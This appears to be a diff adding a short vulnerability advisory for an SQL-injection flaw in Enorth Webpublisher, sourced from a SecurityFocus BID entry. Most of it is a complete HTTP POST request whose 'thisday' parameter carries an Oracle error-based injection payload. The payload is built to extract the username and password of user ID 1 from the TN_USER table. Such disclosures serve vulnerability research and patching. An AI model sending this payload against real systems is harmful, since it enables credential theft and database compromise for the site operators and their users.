@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/64110/info
+
+Enorth Webpublisher is prone to an SQL-injection vulnerability because the application fails to properly sanitize user-supplied input.
+
+A successful exploit will allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database. 
+
+POST /pub/m_worklog/log_searchday.jsp HTTP/1.1
+Host: www.example.com
+User-Agent:
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-cn
+Accept-Encoding: gzip, deflate
+Cookie:
+Pragma: no-cache
+Proxy-Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 180
+thisday=20131012') and UTL_INADDR.get_host_name((select v from (select rownum,USER_NAME||chr(94)||PASS_WORD v from TN_USER WHERE USER_ID=1) where rownum=1))>0--&cx.y=16&querytype= 
